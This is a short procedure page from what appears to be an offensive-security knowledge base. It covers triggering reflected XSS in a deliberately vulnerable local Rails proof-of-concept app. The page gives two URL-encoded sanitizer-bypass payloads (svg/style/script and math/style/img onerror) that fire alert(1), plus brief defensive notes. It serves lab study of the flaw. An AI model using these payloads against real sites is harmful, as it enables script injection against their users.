---
id: proc-trigger-xss-poc
tags:
  - xss
  - reflected
  - browser
type: procedure
tools:
  - '[[tools/Web Browser]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:25.763Z'
skill_level: beginner
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Trigger-Reflected-XSS-via-PoC-Endpoints

## Summary

This procedure exploits the vulnerable Rails app by sending URL-encoded payloads to /poc1 and /poc2 endpoints, resulting in reflected XSS execution in the browser.

## Description

The PoC app reflects user input from ?name= parameter through sanitize with vulnerable tags. Visiting endpoints with payloads like <svg><style><script>alert(1)</script></style></svg> URL-encoded causes the browser to render and execute the unsanitized JavaScript, demonstrating reflected XSS impact.

## Requirements

1. Running vulnerable Rails app on localhost:8888
2. Web browser (e.g., Chrome, Firefox)
3. URL encoding knowledge for payloads

## Defense

Defensive measures and detection strategies:

- Input validation beyond sanitization
- CSP headers to prevent script execution
- Browser extensions for XSS detection
- Server logs for suspicious parameters

## Objectives

1. Inject and reflect malicious payloads
2. Execute JavaScript in browser context
3. Confirm XSS exploitability

## Instructions

### Step 1: Access PoC1 Endpoint

**Context**: Target svg+style bypass.

No command; use browser to visit:
http://127.0.0.1:8888/poc1?name=%3Csvg%3E%3Cstyle%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E%3C%2Fstyle%3E%3C%2Fsvg%3E

> Payload decodes and renders, triggering alert(1).

### Step 2: Access PoC2 Endpoint

**Context**: Target math+style bypass.

Visit:
http://127.0.0.1:8888/poc2?name=%3Cmath%3E%3Cstyle%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E%3C%2Fstyle%3E%3C%2Fmath%3E

> onerror fires, executing alert(1).

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Web Browser]]

## Tags

- [[xss]]
- [[reflected]]
